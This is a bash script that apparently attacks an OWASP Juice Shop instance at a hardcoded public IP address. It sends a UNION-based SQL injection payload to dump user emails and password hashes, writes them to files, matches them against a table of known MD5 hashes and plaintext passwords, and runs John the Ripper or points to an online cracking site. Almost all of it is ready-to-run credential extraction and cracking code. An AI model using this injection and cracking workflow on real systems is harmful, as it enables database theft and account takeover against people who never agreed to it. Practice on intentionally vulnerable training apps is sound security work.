#!/bin/bash

# OWASP Juice Shop - Username/Password Extraction & Cracking Script
# This script extracts credentials via SQL injection and attempts to crack them

echo "=================================================="
echo "   Juice Shop Credential Extractor & Cracker"
echo "=================================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if Python3 is installed
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: Python3 is not installed${NC}"
    echo "Install with: brew install python3"
    exit 1
fi

# Check if requests module is installed
python3 -c "import requests" 2>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${YELLOW}Installing required Python module: requests${NC}"
    pip3 install requests
fi

# Run the Python script
python3 download_usernames_passwords.py

# Alternative method using curl and jq if Python fails
if [ $? -ne 0 ]; then
    echo -e "${YELLOW}Python script failed. Trying alternative method...${NC}"
    
    # Check for required tools
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}Error: curl is not installed${NC}"
        exit 1
    fi
    
    if ! command -v jq &> /dev/null; then
        echo -e "${YELLOW}Installing jq...${NC}"
        if [[ "$OSTYPE" == "darwin"* ]]; then
            brew install jq
        else
            sudo apt-get install -y jq
        fi
    fi
    
    # Extract using curl
    echo -e "${GREEN}Extracting credentials...${NC}"
    
    URL="http://155.138.197.128:3003/rest/products/search?q='))UNION%20SELECT%201,2,3,4,group_concat(email||':'||password),6,7,8,9%20FROM%20Users--"
    
    # Fetch data
    RESPONSE=$(curl -s "$URL")
    
    # Extract the credentials (they're in the deluxePrice field)
    CREDS=$(echo "$RESPONSE" | jq -r '.data[0].deluxePrice // .data[0].name // .data[0].description')
    
    if [ -z "$CREDS" ]; then
        echo -e "${RED}Failed to extract credentials${NC}"
        echo "Response: $RESPONSE"
        exit 1
    fi
    
    echo -e "${GREEN}Extracted credentials:${NC}"
    echo "$CREDS"
    
    # Save to file
    echo "$CREDS" | tr ',' '\n' > extracted_credentials.txt
    
    # Create hash file for John
    echo -e "${GREEN}Creating hash file for John the Ripper...${NC}"
    echo "$CREDS" | tr ',' '\n' > hashes.txt
    
    # Known passwords (hardcoded for quick lookup)
    echo -e "${GREEN}Checking known passwords...${NC}"
    
    declare -A known_hashes
    known_hashes["0192023a7bbd73250516f069df18b500"]="admin123"
    known_hashes["e541ca7ecf72b8d1286474fc613e5e45"]="ncc-1701"
    known_hashes["0c36e517e3fa95aabf1bbffc6744a4ef"]="booze"
    known_hashes["b03f4b0ba8b458fa0acdc02cdb953bc8"]="Mr. N00dles"
    known_hashes["030f05e45e30710c3ad3c32f00de0473"]="K1f....................Oo!"
    
    # Process each credential
    while IFS=':' read -r email hash; do
        if [ ! -z "$email" ] && [ ! -z "$hash" ]; then
            echo -n "User: $email - "
            if [ "${known_hashes[$hash]}" ]; then
                echo -e "${GREEN}Password: ${known_hashes[$hash]}${NC}"
            else
                echo -e "${YELLOW}Hash: $hash (unknown)${NC}"
            fi
        fi
    done < <(echo "$CREDS" | tr ',' '\n')
    
    # Try John the Ripper if available
    if command -v john &> /dev/null; then
        echo -e "${GREEN}Running John the Ripper...${NC}"
        john --format=raw-md5 hashes.txt
        john --show hashes.txt
    else
        echo -e "${YELLOW}John the Ripper not installed${NC}"
        echo "Install with: brew install john"
        echo "Or crack hashes online at: https://crackstation.net/"
    fi
fi

echo -e "${GREEN}Done!${NC}"
echo "Files created:"
echo "  - hashes.txt (for John the Ripper)"
echo "  - extracted_credentials.txt (raw output)"
echo "  - credentials_report_*.txt (detailed report)"

# Display summary
echo ""
echo "Quick crack command:"
echo "  john --format=raw-md5 hashes.txt"
echo ""
echo "Online cracking:"
echo "  https://crackstation.net/"